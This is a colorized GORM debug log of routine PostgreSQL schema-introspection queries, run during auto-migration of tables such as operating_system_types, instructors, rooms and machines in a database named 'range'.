[0m[33m[0.599ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.603ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.156ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.788ms] [34;1m[rows:-][0m SELECT * FROM "operating_system_types" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.156ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.090ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'operating_system_types'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.552ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'operating_system_types'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.075ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.921ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.896ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.065ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'operating_system_types' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'operating_system_types' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.324ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'operating_system_types' AND indexname = 'idx_operating_system_types_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.663ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.352ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.192ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.538ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.843ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.754ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.567ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.074ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.119ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.114ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.360ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.408ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.224ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.909ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.800ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.849ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.635ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.511ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.195ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.784ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.379ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.697ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.548ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.063ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.078ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.137ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.092ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.257ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.117ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.069ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.108ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.278ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.885ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.949ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.646ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.341ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.968ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.730ms] [34;1m[rows:-][0m SELECT * FROM "machines" LIMIT 5

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.298ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.308ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.638ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'machines'

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.284ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.259ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.082ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:46 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
